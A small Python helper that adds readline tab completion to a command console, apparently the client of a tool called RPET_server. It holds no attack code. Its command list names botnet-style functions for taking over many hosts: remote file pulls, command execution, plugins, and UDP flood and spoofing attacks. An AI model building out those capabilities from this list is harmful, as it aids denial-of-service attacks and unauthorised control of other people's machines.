import readline

class autocomplete(object):
    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            if text:
                self.matches = [s
                    for s in self.options
                    if s and s.startswith(text)
                ]
            else:
                self.matches = self.options[:]

        try:
            response = self.matches[state]
        except IndexError:
            response = None
        return response



#You can add more commands here, i just get them 'RPET_server.py'
def commands():
    return [
        "List_Hosts",
        "Choose_Host",
        "Select",
        "ALL",
        "Pull_File",
        "Pull_Binary",
        "Make_File",
        "Make_Binary",
        "UDP_Flood",
        "UDP_Spoof",
        "KILL",
        "help",
        "List_Sel_Hosts",
        "Close_Connection",
        "Exit",
        "Quit",
        "Execute",
        "Install_Plugin",
        "Load_Plugin",
        "Available_Plugins",
        "Installed_Plugins",
        "Loaded_Plugins",
        ]


readline.set_completer(autocomplete(commands()).complete)
readline.parse_and_bind('tab: complete')
